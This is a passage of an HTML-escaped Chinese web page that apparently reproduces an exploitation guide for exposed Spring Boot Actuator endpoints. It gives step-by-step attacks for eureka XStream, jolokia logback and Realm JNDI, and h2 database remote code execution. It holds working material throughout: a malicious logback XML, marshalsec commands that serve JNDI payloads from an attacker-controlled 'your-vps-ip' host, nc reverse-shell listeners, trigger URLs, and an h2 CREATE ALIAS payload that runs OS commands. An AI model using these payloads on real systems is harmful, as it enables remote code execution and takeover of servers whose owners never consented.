  &lt;li&gt;eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址&lt;/li&gt;
  &lt;li&gt;refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload&lt;/li&gt;
  &lt;li&gt;目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析-2&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://www.freebuf.com/column/234719.html&quot;&gt;Spring Boot Actuator从未授权访问到getshell&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-2&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce&quot;&gt;repository/springboot-eureka-xstream-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9093/env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x04jolokia-logback-jndi-rce&quot;&gt;0x04：jolokia logback JNDI RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-7&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-7&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一查看已存在的-mbeans&quot;&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt;

&lt;p&gt;访问 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadByURL&lt;/code&gt; 关键词。&lt;/p&gt;

&lt;h5 id=&quot;步骤二托管-xml-文件&quot;&gt;步骤二：托管 xml 文件&lt;/h5&gt;

&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;

python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在根目录放置以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml&lt;/code&gt; 结尾的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.xml&lt;/code&gt;  文件，内容如下：&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;insertFromJNDI&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;env-entry-name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ldap://your-vps-ip:1389/JNDIObject&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;as=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;appName&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤三准备要执行的-java-代码&quot;&gt;步骤三：准备要执行的 Java 代码&lt;/h5&gt;

&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt;

&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javac &lt;span class=&quot;nt&quot;&gt;-source&lt;/span&gt; 1.5 &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; 1.5 JNDIObject.java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后将生成的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt;

&lt;h5 id=&quot;步骤四架设恶意-ldap-服务&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt;

&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤五监听反弹-shell-的端口&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;

&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lv&lt;/span&gt; 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤六从外部-url-地址加载日志配置文件&quot;&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;替换实际的 your-vps-ip 地址访问 URL 触发漏洞：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;漏洞原理-3&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 类的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadByURL&lt;/code&gt; 方法&lt;/li&gt;
  &lt;li&gt;目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容&lt;/li&gt;
  &lt;li&gt;目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)&lt;/li&gt;
  &lt;li&gt;xml 文件中利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logback&lt;/code&gt; 依赖的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insertFormJNDI&lt;/code&gt; 标签，设置了外部 JNDI 服务器地址&lt;/li&gt;
  &lt;li&gt;目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析-3&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://xz.aliyun.com/t/4258&quot;&gt;spring boot actuator rce via jolokia&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-3&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&quot;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9094/env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x05jolokia-realm-jndi-rce&quot;&gt;0x05：jolokia Realm JNDI RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-8&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u141/7u131/8u121（RMI 方式）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-8&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一查看已存在的-mbeans-1&quot;&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt;

&lt;p&gt;访问 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type=MBeanFactory&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;createJNDIRealm&lt;/code&gt; 关键词。&lt;/p&gt;

&lt;h5 id=&quot;步骤二准备要执行的-java-代码&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt;

&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;。&lt;/p&gt;

&lt;h5 id=&quot;步骤三托管-class-文件&quot;&gt;步骤三：托管 class 文件&lt;/h5&gt;

&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;

python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt;

&lt;h5 id=&quot;步骤四架设恶意-rmi-服务&quot;&gt;步骤四：架设恶意 rmi 服务&lt;/h5&gt;

&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 rmi 服务：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤五监听反弹-shell-的端口-1&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;

&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤六发送恶意-payload&quot;&gt;步骤六：发送恶意 payload&lt;/h5&gt;

&lt;p&gt;根据实际情况修改 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py&quot;&gt;springboot-realm-jndi-rce.py&lt;/a&gt; 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。&lt;/p&gt;

&lt;h4 id=&quot;漏洞原理-4&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm&lt;/li&gt;
  &lt;li&gt;设置 connectionURL 地址为 RMI Service URL&lt;/li&gt;
  &lt;li&gt;设置 contextFactory 为 RegistryContextFactory&lt;/li&gt;
  &lt;li&gt;停止 Realm&lt;/li&gt;
  &lt;li&gt;启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析-4&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html&quot;&gt;Yet Another Way to Exploit Spring Boot Actuators via Jolokia&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-4&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&quot;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9094/env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x06h2-database-query-rce&quot;&gt;0x06：h2 database query RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-9&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/restart&lt;/code&gt; 接口重启应用（存在 spring-boot-starter-actuator 依赖）&lt;/li&gt;
  &lt;li&gt;存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-9&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一设置-springdatasourcehikariconnection-test-query-属性&quot;&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;spring 1.x（无回显执行命令）&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x（无回显执行命令）&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤二重启应用&quot;&gt;步骤二：重启应用&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /restart
Content-Type: application/x-www-form-urlencoded

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/restart
Content-Type: application/json

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;漏洞原理-5&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CREATE ALIAS&lt;/code&gt; 创建自定义函数的 SQL 语句&lt;/li&gt;
  &lt;li&gt;其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句&lt;/li&gt;
  &lt;li&gt;restart 重启应用，会建立新的数据库连接&lt;/li&gt;
  &lt;li&gt;如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析-5&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&quot;&gt;remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-5&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&quot;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9096/actuator/env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x07h2-database-console-jndi-rce&quot;&gt;0x07：h2 database console JNDI RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-10&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
  &lt;li&gt;spring 配置中启用 h2 console  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.h2.console.enabled=true&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-10&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一访问路由获得-jsessionid&quot;&gt;步骤一：访问路由获得 jsessionid&lt;/h5&gt;

&lt;p&gt;直接访问目标开启 h2 console 的默认路由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/h2-console&lt;/code&gt;，目标会跳转到页面 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/h2-console/login.jsp?jsessionid=xxxxxx&lt;/code&gt;，记录下实际的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsessionid=xxxxxx&lt;/code&gt; 值。&lt;/p&gt;

&lt;h5 id=&quot;步骤二准备要执行的-java-代码-1&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt;

&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt;

&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javac &lt;span class=&quot;nt&quot;&gt;-source&lt;/span&gt; 1.5 &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; 1.5 JNDIObject.java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后将生成的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt;

&lt;h5 id=&quot;步骤三托管-class-文件-1&quot;&gt;步骤三：托管 class 文件&lt;/h5&gt;

&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;

python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt;

&lt;h5 id=&quot;步骤四架设恶意-ldap-服务-1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt;

&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤五监听反弹-shell-的端口-2&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;

&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lv&lt;/span&gt; 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤六发包触发-jndi-注入&quot;&gt;步骤六：发包触发 JNDI 注入&lt;/h5&gt;

&lt;p&gt;根据实际情况，替换下面数据中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsessionid=xxxxxx&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap://your-vps-ip:1389/JNDIObject&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /h2-console/login.do?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxxx
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Referer: http://www.example.com/h2-console/login.jsp?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxxx

&lt;span class=&quot;nv&quot;&gt;language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en&amp;amp;setting&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Generic+H2+%28Embedded%29&amp;amp;name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Generic+H2+%28Embedded%29&amp;amp;driver&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javax.naming.InitialContext&amp;amp;url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ldap://your-vps-ip:1389/JNDIObject&amp;amp;user&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;漏洞分析-6&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ&quot;&gt;Spring Boot + H2数据库JNDI注入&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-6&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&quot;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9096/h2-console
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

